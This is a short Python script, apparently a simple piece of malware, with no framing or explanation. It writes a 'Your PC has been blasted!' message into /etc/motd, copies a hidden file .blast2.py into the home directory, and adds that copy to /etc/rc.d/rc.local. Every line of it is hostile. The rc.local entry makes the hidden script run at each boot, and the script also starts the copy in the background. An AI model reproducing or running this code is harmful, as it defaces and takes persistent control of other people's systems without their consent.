#/usr/local/bin/python
import os
os.system('echo "Your PC has been blasted!" > /etc/motd')
os.system('cp .blast2.py ~/.blast.py')
file_object = open('/etc/rc.d/rc.local', 'a')
file_object.write('\n/usr/local/bin/python3 ~/.blast.py')
file_object.close()
os.system('chmod +x /etc/rc.d/rc.local')
os.system("nohup python3 ~/.blast.py")
